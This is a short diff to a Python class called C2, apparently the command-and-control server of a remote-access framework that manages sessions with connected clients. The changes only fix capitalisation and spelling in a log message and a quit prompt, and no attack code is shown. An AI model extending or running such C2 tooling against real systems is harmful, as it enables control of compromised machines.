@@ -322,7 +322,7 @@ class C2():
                     session = s
                     break
             else:
-                util.log("session not found for: {}".format(peer))
+                util.log("Session not found for: {}".format(peer))
         else:
             util.log("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
         return session
@@ -355,7 +355,7 @@ class C2():
         globals()['package_handler'].terminate()
         globals()['module_handler'].terminate()
         globals()['post_handler'].terminate()
-        if self._get_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
+        if self._get_prompt('Quitting server - Keep clients alive? (y/n): ').startswith('y'):
             for session in self.sessions.values():
                 if isinstance(session, Session):
                     try:
